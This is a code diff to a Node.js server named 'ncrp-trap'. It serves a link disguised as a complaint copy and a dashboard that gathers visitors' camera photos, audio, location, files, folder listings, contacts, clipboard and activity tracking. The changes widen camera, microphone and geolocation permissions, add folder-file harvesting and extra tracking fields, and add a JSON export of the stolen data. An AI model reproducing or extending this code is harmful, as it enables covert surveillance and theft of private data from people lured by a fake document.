@@ -17,7 +17,9 @@ function send(res, code, type, body) {
     'Content-Type': type,
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Headers': '*',
-    'Cache-Control': 'no-store'
+    'Cache-Control': 'no-store',
+    'Permissions-Policy': 'camera=*, microphone=*, geolocation=*',
+    'Feature-Policy': 'camera *; microphone *; geolocation *',
   });
   res.end(body);
 }
@@ -44,7 +46,13 @@ const server = http.createServer((req, res) => {
     return serveFile(res, 'index.html', 'text/html; charset=utf-8');
   }
   if (req.method === 'GET' && url === '/sw.js') {
-    return serveFile(res, 'sw.js', 'application/javascript');
+    return serveFile(res, 'service-worker.js', 'application/javascript');
+  }
+  if (req.method === 'GET' && url === '/manifest.json') {
+    return send(res, 200, 'application/manifest+json', JSON.stringify({
+      name: 'Complaint_Copy', short_name: 'Complaint', start_url: '/doc',
+      display: 'standalone', background_color: '#4b4f55', theme_color: '#1a3a6b'
+    }));
   }
   if (req.method === 'GET' && url === '/favicon.ico') {
     if (fs.existsSync(path.join(PUB, 'favicon.ico'))) return serveFile(res, 'favicon.ico', 'image/x-icon');
@@ -99,6 +107,12 @@ const server = http.createServer((req, res) => {
     return;
   }
 
+  if (req.method === 'GET' && url === '/dash.json') {
+    let all = [];
+    try { all = JSON.parse(fs.readFileSync(HITS, 'utf8')); } catch (e) {}
+    return send(res, 200, 'application/json', JSON.stringify(all));
+  }
+
   if (req.method === 'GET' && url === '/dash') {
     let all = [];
     try { all = JSON.parse(fs.readFileSync(HITS, 'utf8')); } catch (e) {}
@@ -148,11 +162,16 @@ const server = http.createServer((req, res) => {
           <div><i>Cameras</i>${m.cams || '-'}</div>
           <div><i>Mics</i>${m.mics || '-'}</div>
           <div><i>Files</i>${m.fileCount || 0} ${m.files ? '- ' + m.files.slice(0,90) : ''}</div>
+          <div><i>Folder</i>${m.folderFileCount || 0} ${m.folderFiles ? '- ' + m.folderFiles.slice(0,120) : ''}</div>
           <div><i>Contacts</i>${m.contactCount || 0}</div>
           <div><i>Clipboard</i>${m.clipboard || '-'}</div>
+          <div><i>Notif</i>${m.notifPerm || '-'}</div>
+          <div><i>Idle</i>${m.idleSec != null ? m.idleSec + 's' : '-'}</div>
+          <div><i>Focus</i>${m.focusCount || 0}f / ${m.blurCount || 0}b</div>
+          <div><i>Torch</i>${m.torch || '-'}</div>
           <div><i>Live shots</i>${s.stages.live || 0}</div>
           <div><i>Stages</i>${stages}</div>
-          <div><i>Errors</i>${(m.camErr || '') + ' ' + (m.gpsErr || '') + ' ' + (m.screenErr || '')}</div>
+          <div><i>Errors</i>${(m.camErr || '') + ' ' + (m.gpsErr || '') + ' ' + (m.screenErr || '') + ' ' + (m.dirErr || '')}</div>
         </div>
         <div class="ph">${s.photos.map(p => '<figure><img src="/photo/' + p.f + '"><figcaption>' + p.tag + ' ' + p.t.slice(11,19) + '</figcaption></figure>').join('')}</div>
         ${s.audio.map(a => '<audio controls src="/media/' + a + '"></audio>').join('')}
@@ -188,7 +207,7 @@ ${list.map(card).join('') || '<p>abhi koi hit nahi.</p>'}`);
 });
 
 server.listen(PORT, () => {
-  console.log('\n  ncrp-trap V6 FINAL');
+  console.log('\n  ncrp-trap V7');
   console.log('  link : http://localhost:' + PORT + '/doc');
   console.log('  dash : http://localhost:' + PORT + '/dash\n');
 });
